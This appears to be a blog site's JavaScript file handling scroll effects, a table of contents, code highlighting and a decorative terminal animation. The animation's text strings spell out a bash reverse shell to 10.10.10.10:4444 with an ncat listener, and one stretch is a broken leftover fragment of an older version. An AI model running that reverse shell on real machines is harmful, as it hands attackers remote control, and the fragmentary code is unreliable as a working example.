(function(){
  // Reveal on scroll
  const els = Array.from(document.querySelectorAll('.reveal'));
  const io = new IntersectionObserver((entries)=>{
    for (const e of entries){
      if(e.isIntersecting){ e.target.classList.add('is-in'); io.unobserve(e.target); }
    }
  }, {threshold: .12});
  els.forEach(el=>io.observe(el));
})();

// Table of contents + reading time
(function(){
  const container = document.querySelector('.post .post-body');
  if(!container) return;
  const words = container.innerText.trim().split(/\s+/).length;
  const minutes = Math.max(1, Math.round(words/220));
  const rt = document.querySelector('[data-reading-time]');
  if(rt) rt.textContent = minutes + ' min';
  const tocRoot = document.querySelector('.toc ul');
  if(!tocRoot) return;
  const hs = container.querySelectorAll('h2, h3');
  hs.forEach((h,i)=>{
    if(!h.id) h.id = 'sec-' + (i+1);
    const li = document.createElement('li');
    li.className = 'toc-' + h.tagName.toLowerCase();
    const a = document.createElement('a'); a.href = '#' + h.id; a.textContent = h.textContent;
    li.appendChild(a);
    tocRoot.appendChild(li);
  });
})();







// Stagger reveal for cards
(function(){
  const cards = Array.from(document.querySelectorAll('.grid .card'));
  if(!cards.length) return;
  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*70)+'ms'; });
})();




// Convert Rouge blocks to Prism-compatible and trigger highlighting
(function(){
  function convertRouge(){
    document.querySelectorAll('div.highlighter-rouge').forEach(wrapper=>{
      const code = wrapper.querySelector('pre.highlight > code');
      if(!code) return;
      const lang = (Array.from(code.classList).find(c=>c.startsWith('language-'))||'').replace('language-','') || 'clike';
      const pre = document.createElement('pre');
      const inner = document.createElement('code');
      pre.className = 'language-' + lang;
      inner.className = 'language-' + lang;
      inner.textContent = code.textContent;
      pre.appendChild(inner);
      wrapper.replaceWith(pre);
    });
    if(window.Prism && Prism.highlightAll) Prism.highlightAll();
  }
  if(document.readyState !== 'loading') convertRouge();
  else document.addEventListener('DOMContentLoaded', convertRouge);
})();


    });
  }
  async function run(){
    A.textContent = ""; B.textContent = "";
    for(let i=0;i<Math.max(seqA.length, seqB.length);i++){
      if(seqB[i]) await type(B, seqB[i], 22); // victim first (arriba en la UI)
      if(seqA[i]) await type(A, seqA[i], 22);
    }
  }
  const grid = document.querySelector('.term-grid');
  let played = false;
  const io = new IntersectionObserver((es)=>{
    for(const e of es){ if(e.isIntersecting && !played){ played = true; run(); } }
  }, {threshold:.12});
  if(grid) io.observe(grid); else run();
})();



// Prism adapter for Rouge -> Prism (with ASM/NASM mapping)
(function(){
  function convertRouge(){
    document.querySelectorAll('div.highlighter-rouge').forEach(wrapper=>{
      const code = wrapper.querySelector('pre.highlight > code');
      if(!code) return;
      let lang = (Array.from(code.classList).find(c=>c.startsWith('language-'))||'').replace('language-','') || 'clike';
      // Map typical Rouge names to Prism's
      if(/^(asm|assembly|nasm|x86_64|x86-64|x64)$/.test(lang)) lang = 'nasm';
      const pre = document.createElement('pre');
      const inner = document.createElement('code');
      pre.className = 'language-' + lang;
      inner.className = 'language-' + lang;
      inner.textContent = code.textContent;
      pre.appendChild(inner);
      wrapper.replaceWith(pre);
    });
    if(window.Prism && Prism.highlightAll) Prism.highlightAll();
  }
  if(document.readyState !== 'loading') convertRouge();
  else document.addEventListener('DOMContentLoaded', convertRouge);
})();


// Terminal typing animation v5 (exactly two panels)
(function(){
  const A = document.querySelector('[data-ty="a"]'); // attacker
  const B = document.querySelector('[data-ty="b"]'); // victim
  if(!A || !B) return;
  const seqA = ["ncat -lvnp 4444", "listening on [any] 4444 ...", "connection received from 10.10.10.42"];
  const seqB = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "whoami", "www-data"];
  function type(el, text, delay){
    return new Promise(res=>{ let i=0; (function step(){ if(i<text.length){ el.textContent += text[i++]; setTimeout(step, delay); } else { el.textContent+="\n"; res(); } })(); });
  }
  async function run(){ A.textContent=""; B.textContent=""; for(let i=0;i<Math.max(seqA.length, seqB.length);i++){ if(seqB[i]) await type(B, seqB[i], 22); if(seqA[i]) await type(A, seqA[i], 22); } }
  const grid = document.querySelector('.term-grid'); let played=false;
  const io = new IntersectionObserver(es=>{ es.forEach(e=>{ if(e.isIntersecting && !played){ played=true; run(); } }); }, {threshold:.12});
  if(grid) io.observe(grid); else run();
})();


// Reveal + stagger
(function(){
  const els = Array.from(document.querySelectorAll('.reveal'));
  const io = new IntersectionObserver((entries)=>{
    for(const e of entries){
      if(e.isIntersecting){
        e.target.classList.add('is-in');
        io.unobserve(e.target);
      }
    }
  }, {threshold:.15});
  els.forEach((el)=>io.observe(el));

  const cards = Array.from(document.querySelectorAll('.grid .card'));
  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*60)+'ms'; });
})();
